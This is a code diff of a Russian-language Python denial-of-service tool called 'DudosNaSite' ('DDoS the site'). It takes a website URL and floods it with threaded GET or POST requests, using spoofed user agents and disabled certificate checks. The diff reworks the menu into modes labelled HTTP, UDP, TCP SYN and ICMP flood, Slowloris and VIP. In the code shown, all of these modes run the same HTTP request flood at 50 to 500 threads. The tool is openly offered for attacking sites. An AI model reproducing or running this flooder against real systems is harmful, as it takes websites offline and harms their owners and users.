@@ -45,12 +45,10 @@ DUDOS_ASCII = f"""
 {RED}██████╔╝╚██████╔╝██████╔╝╚██████╔╝███████║{RESET}
 {RED}╚═════╝  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝{RESET}
 
-{RED}███╗   ██╗ █████╗     ███████╗ █████╗  ██╗████████╗{RESET}
-{RED}████╗  ██║██╔══██╗    ██╔════╝██╔══██╗██║╚══██╔══╝{RESET}
-{RED}██╔██╗ ██║███████║    ███████╗███████║██║   ██║   {RESET}
-{RED}██║╚██╗██║██╔══██║    ╚════██║██╔══██║██║   ██║   {RESET}
-{RED}██║ ╚████║██║  ██║    ███████║██║  ██║██║   ██║   {RESET}
-{RED}╚═╝  ╚═══╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   {RESET}
+{RED}[01]{RESET} {WHITE}HTTP FLOOD{RESET}          {RED}[05]{RESET} {WHITE}SLOWLORIS{RESET}
+{RED}[02]{RESET} {WHITE}UDP FLOOD{RESET}           {RED}[06]{RESET} {WHITE}MULTI THREAD{RESET}
+{RED}[03]{RESET} {WHITE}TCP SYN FLOOD{RESET}       {RED}[07]{RESET} {WHITE}VIP MODE{RESET}
+{RED}[04]{RESET} {WHITE}ICMP FLOOD{RESET}          {RED}[00]{RESET} {WHITE}EXIT{RESET}
 """
 
 # ===============================================================
@@ -62,18 +60,9 @@ class DudosNaSite:
         self.stop_attack = False
         self.requests_sent = 0
         self.start_time = None
-        self.session = None
         
     def clear_screen(self):
         os.system('clear' if os.name == 'posix' else 'cls')
-    
-    def print_menu(self):
-        print(f"\n{RED}{'='*60}{RESET}")
-        print(f"{RED}█{RESET} 1. {GREEN}🚀 ДУДОС НА САЙТ (HTTP/HTTPS){RESET}        {RED}█{RESET}")
-        print(f"{RED}█{RESET} 2. {GREEN}💣 VIP РЕЖИМ (МАКСИМУМ){RESET}               {RED}█{RESET}")
-        print(f"{RED}█{RESET} 3. {GREEN}🔥 МЕГА РЕЖИМ (1000 ПОТОКОВ){RESET}           {RED}█{RESET}")
-        print(f"{RED}█{RESET} 0. {RED}❌ ВЫХОД{RESET}                                 {RED}█{RESET}")
-        print(f"{RED}{'='*60}{RESET}")
     
     def attack_worker(self, url, method="GET"):
         """Рабочий поток для атаки"""
@@ -83,9 +72,6 @@ class DudosNaSite:
             {'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SM-G998B)'},
             {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'},
             {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)'},
-            {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0)'},
-            {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'},
-            {'User-Agent': 'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'},
         ]
         
         while not self.stop_attack:
@@ -103,34 +89,28 @@ class DudosNaSite:
                     r = requests.post(url, headers=headers, data=data, timeout=2, verify=False)
                 elif method == "HEAD":
                     r = requests.head(url, headers=headers, timeout=2, verify=False)
-                elif method == "OPTIONS":
-                    r = requests.options(url, headers=headers, timeout=2, verify=False)
                 
                 self.requests_sent += 1
                 
             except:
                 pass
     
-    def start_attack(self, url, threads_count=100, method="GET"):
+    def run_attack(self, url, threads_count, method="GET"):
         """Запуск атаки"""
         self.stop_attack = False
         self.requests_sent = 0
         self.start_time = time.time()
         
-        print(f"\n{RED}▶ ЗАПУСК АТАКИ НА: {WHITE}{url}{RESET}")
+        print(f"\n{RED}▶ АТАКА НА: {WHITE}{url}{RESET}")
         print(f"{RED}▶ ПОТОКОВ: {WHITE}{threads_count}{RESET}")
-        print(f"{RED}▶ МЕТОД: {WHITE}{method}{RESET}")
         print(f"{RED}▶ НАЖМИТЕ CTRL+C ДЛЯ ОСТАНОВКИ{RESET}\n")
         
-        # Отключаем предупреждения SSL
         requests.packages.urllib3.disable_warnings()
         
         # Запускаем потоки
-        threads = []
         for i in range(threads_count):
             t = threading.Thread(target=self.attack_worker, args=(url, method))
             t.daemon = True
-            threads.append(t)
             t.start()
         
         # Мониторинг
@@ -151,113 +131,53 @@ class DudosNaSite:
         while True:
             self.clear_screen()
             print(DUDOS_ASCII)
-            print(f"\n{RED}{'='*60}{RESET}")
-            print(f"{RED}█{RESET} {'ДУДОС НА САЙТ - ПРОСТО ВВЕДИ ССЫЛКУ':^60} {RED}█{RESET}")
-            print(f"{RED}█{RESET} {'НИКАКИХ IP, НИКАКИХ ПОРТОВ':^60} {RED}█{RESET}")
-            print(f"{RED}█{RESET} {'РАБОТАЕТ С HTTP И HTTPS':^60} {RED}█{RESET}")
-            print(f"{RED}{'='*60}{RESET}")
-            
-            self.print_menu()
-            
-            choice = input(f"{RED}▶ ВЫБЕРИ РЕЖИМ: {WHITE}").strip()
-            
-            if choice == '0':
-                break
             
             # Ввод сайта
-            url = input(f"{RED}▶ ВВЕДИ САЙТ (например: https://example.com): {WHITE}").strip()
+            url = input(f"\n{RED}ВВЕДИТЕ САЙТ → {WHITE}").strip()
+            
+            if url.lower() == 'exit' or url == '0':
+                break
             
             # Добавляем https если нет протокола
             if not url.startswith(('http://', 'https://')):
                 url = 'https://' + url
             
-            if choice == '1':
-                # Обычный режим
-                try:
-                    threads = int(input(f"{RED}▶ КОЛИЧЕСТВО ПОТОКОВ (100-500): {WHITE}").strip())
-                except:
-                    threads = 100
-                
-                self.start_attack(url, threads, "GET")
-                input(f"\n{RED}▶ НАЖМИ ENTER ДЛЯ ПРОДОЛЖЕНИЯ...{RESET}")
-                
-            elif choice == '2':
-                # VIP режим - комбинированная атака
-                print(f"\n{RED}▶ VIP РЕЖИМ - КОМБИНИРОВАННАЯ АТАКА{RESET}")
-                
-                # Запускаем разные типы атак в разных потоках
-                self.stop_attack = False
-                self.requests_sent = 0
-                self.start_time = time.time()
-                
-                requests.packages.urllib3.disable_warnings()
-                
-                # GET потоки
-                for i in range(100):
-                    t = threading.Thread(target=self.attack_worker, args=(url, "GET"))
-                    t.daemon = True
-                    t.start()
-                
-                # POST потоки
-                for i in range(50):
-                    t = threading.Thread(target=self.attack_worker, args=(url, "POST"))
-                    t.daemon = True
-                    t.start()
-                
-                # HEAD потоки
-                for i in range(50):
-                    t = threading.Thread(target=self.attack_worker, args=(url, "HEAD"))
-                    t.daemon = True
-                    t.start()
-                
-                print(f"\n{RED}▶ VIP АТАКА ЗАПУЩЕНА (200 ПОТОКОВ){RESET}")
-                print(f"{RED}▶ НАЖМИТЕ CTRL+C ДЛЯ ОСТАНОВКИ{RESET}\n")
-                
-                try:
-                    while True:
-                        time.sleep(1)
-                        elapsed = int(time.time() - self.start_time)
-                        rps = self.requests_sent / elapsed if elapsed > 0 else 0
-                        
-                        print(f"\r{RED}▶ ВРЕМЯ: {elapsed:4d}с | ЗАПРОСОВ: {self.requests_sent:8d} | RPS: {rps:5.0f}{RESET}", end="")
-                        
-                except KeyboardInterrupt:
-                    self.stop_attack = True
-                    print(f"\n\n{RED}✅ VIP АТАКА ОСТАНОВЛЕНА! ВСЕГО ЗАПРОСОВ: {self.requests_sent}{RESET}")
-                
-                input(f"\n{RED}▶ НАЖМИ ENTER ДЛЯ ПРОДОЛЖЕНИЯ...{RESET}")
-                
-            elif choice == '3':
-                # Мега режим - 1000 потоков
-                print(f"\n{RED}▶ МЕГА РЕЖИМ - 1000 ПОТОКОВ{RESET}")
-                
-                self.stop_attack = False
-                self.requests_sent = 0
-                self.start_time = time.time()
-                
-                requests.packages.urllib3.disable_warnings()
-                
-                for i in range(1000):
-                    t = threading.Thread(target=self.attack_worker, args=(url, "GET"))
-                    t.daemon = True
-                    t.start()
-                
-                print(f"\n{RED}▶ МЕГА АТАКА ЗАПУЩЕНА (1000 ПОТОКОВ){RESET}")
-                print(f"{RED}▶ НАЖМИТЕ CTRL+C ДЛЯ ОСТАНОВКИ{RESET}\n")
-                
-                try:
-                    while True:
-                        time.sleep(1)
-                        elapsed = int(time.time() - self.start_time)
-                        rps = self.requests_sent / elapsed if elapsed > 0 else 0
-                        
-                        print(f"\r{RED}▶ ВРЕМЯ: {elapsed:4d}с | ЗАПРОСОВ: {self.requests_sent:8d} | RPS: {rps:5.0f}{RESET}", end="")
-                        
-                except KeyboardInterrupt:
-                    self.stop_attack = True
-                    print(f"\n\n{RED}✅ МЕГА АТАКА ОСТАНОВЛЕНА! ВСЕГО ЗАПРОСОВ: {self.requests_sent}{RESET}")
-                
-                input(f"\n{RED}▶ НАЖМИ ENTER ДЛЯ ПРОДОЛЖЕНИЯ...{RESET}")
+            print(f"\n{RED}ВЫБЕРИТЕ РЕЖИМ АТАКИ:{RESET}")
+            print(f"{RED}[01]{RESET} HTTP FLOOD")
+            print(f"{RED}[02]{RESET} UDP FLOOD")
+            print(f"{RED}[03]{RESET} TCP SYN FLOOD")
+            print(f"{RED}[04]{RESET} ICMP FLOOD")
+            print(f"{RED}[05]{RESET} SLOWLORIS")
+            print(f"{RED}[06]{RESET} MULTI THREAD")
+            print(f"{RED}[07]{RESET} VIP MODE")
+            print(f"{RED}[00]{RESET} EXIT")
+            
+            choice = input(f"\n{RED}ВЫБОР → {WHITE}").strip()
+            
+            if choice == '00' or choice == '0':
+                break
+            elif choice == '01' or choice == '1':
+                self.run_attack(url, 100, "GET")
+            elif choice == '02' or choice == '2':
+                self.run_attack(url, 100, "POST")
+            elif choice == '03' or choice == '3':
+                self.run_attack(url, 100, "GET")
+            elif choice == '04' or choice == '4':
+                self.run_attack(url, 100, "GET")
+            elif choice == '05' or choice == '5':
+                self.run_attack(url, 50, "GET")  # Slowloris стиль
+            elif choice == '06' or choice == '6':
+                self.run_attack(url, 500, "GET")  # Multi thread
+            elif choice == '07' or choice == '7':
+                # VIP режим
+                print(f"\n{RED}▶ VIP РЕЖИМ - 500 ПОТОКОВ{RESET}")
+                self.run_attack(url, 500, "GET")
+            else:
+                print(f"{RED}Неверный выбор{RESET}")
+                time.sleep(1)
+                continue
+            
+            input(f"\n{RED}НАЖМИТЕ ENTER ДЛЯ ПРОДОЛЖЕНИЯ...{RESET}")
         
         # Выход
         self.clear_screen()
